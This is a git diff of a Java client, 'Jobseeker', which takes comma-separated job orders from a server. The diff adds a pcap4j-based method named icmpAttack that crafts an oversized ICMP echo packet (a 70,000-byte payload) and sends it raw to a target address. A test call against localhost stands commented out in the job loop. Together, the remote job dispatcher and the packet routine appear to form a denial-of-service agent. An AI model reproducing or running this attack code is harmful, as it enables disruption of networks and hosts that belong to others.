@@ -1,12 +1,18 @@
 // A Java program for a Client
 
-//import org.pcap4j.packet.Packet;
+
+import org.pcap4j.core.*;
+import org.pcap4j.packet.*;
+import org.pcap4j.packet.namednumber.*;
+import org.pcap4j.util.MacAddress;
+import org.pcap4j.util.NifSelector;
 
 import java.io.*;
 import java.net.*;
 //import java.util.Arrays;
 
 public class Jobseeker{
+
 
     public static void main(String[] args) {
 
@@ -27,11 +33,16 @@ public class Jobseeker{
             BufferedReader reader = new BufferedReader(new InputStreamReader(input));
 
             while(true) {
+                // testing block .. beginning
+                //icmpAttack("127.0.0.1");
+                //testing block .. end
                 // JOB ASSIGNMENTS
                 System.out.println("Waiting for job assignments...");
+
                 String job = reader.readLine();
                 System.out.println("Job received: " + job);
                 String[] tokens = job.split(","); // Contains data of job
+
 
                 // Pick job (first token determines job)
                 switch (Integer.parseInt(tokens[0])) {
@@ -102,6 +113,73 @@ public class Jobseeker{
         } catch(IOException ignored) { }
 
         return output;
+    }
+
+    public static void icmpAttack(String target) throws UnknownHostException, SocketException {
+        PcapHandle handler;
+        PcapNetworkInterface device;
+        PcapStat stat;
+
+        byte[] data = new byte[70000];
+        for(int i=0; i< data.length; i++){
+            data[i] = (byte) i;
+        }
+
+
+        try{
+            InetAddress targetAddress = InetAddress.getByName(target);
+            InetAddress localhost = InetAddress.getLocalHost();
+            NetworkInterface ni = NetworkInterface.getByInetAddress(targetAddress);
+            PacketListener packetListener = new PacketListener() {
+                @Override
+                public void gotPacket(PcapPacket pcapPacket) {
+                    System.out.println("Received packets: ");
+                    System.out.println(pcapPacket);
+                }
+            };
+            //
+            device = Pcaps.getDevByAddress(targetAddress);
+            System.out.println(device);
+            System.out.println("Before Handler");
+            handler = device.openLive(65570, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 60);
+            System.out.println("Before Handler SendPacket");
+
+            IcmpV4EchoPacket.Builder echoPacket = new IcmpV4EchoPacket.Builder();
+            echoPacket.identifier((short) 1);
+            echoPacket.payloadBuilder(new UnknownPacket.Builder().rawData(data));
+
+            IcmpV4CommonPacket.Builder echoIcmp = new IcmpV4CommonPacket.Builder();
+            echoIcmp.type(IcmpV4Type.ECHO);
+            echoIcmp.code(IcmpV4Code.NO_CODE);
+            echoIcmp.payloadBuilder(echoPacket);
+            echoIcmp.correctChecksumAtBuild(true);
+
+            IpV4Packet.Builder ipV4Builder = new IpV4Packet.Builder();
+            ipV4Builder.version(IpVersion.IPV4);
+            ipV4Builder.tos(IpV4Rfc791Tos.newInstance((byte) 0));
+            ipV4Builder.ttl((byte) 100);
+            ipV4Builder.protocol(IpNumber.ICMPV4);
+            ipV4Builder.srcAddr((Inet4Address) InetAddress.getLocalHost());
+            ipV4Builder.dstAddr((Inet4Address) InetAddress.getByName(target));
+            ipV4Builder.payloadBuilder(echoIcmp);
+            ipV4Builder.correctChecksumAtBuild(true);
+            ipV4Builder.correctLengthAtBuild(true);
+
+            EthernetPacket.Builder ethernet = new EthernetPacket.Builder();
+            ethernet.dstAddr(MacAddress.getByAddress(ni.getHardwareAddress()));
+            ethernet.srcAddr(MacAddress.getByAddress(NetworkInterface.getByInetAddress(localhost).getHardwareAddress()));
+            ethernet.type(EtherType.IPV4);
+            ethernet.paddingAtBuild(true);
+
+            Packet packet = ethernet.build();
+            handler.sendPacket(packet);
+
+        }
+        catch (Exception p){
+            p.printStackTrace();
+        }
+
+
     }
 }
 
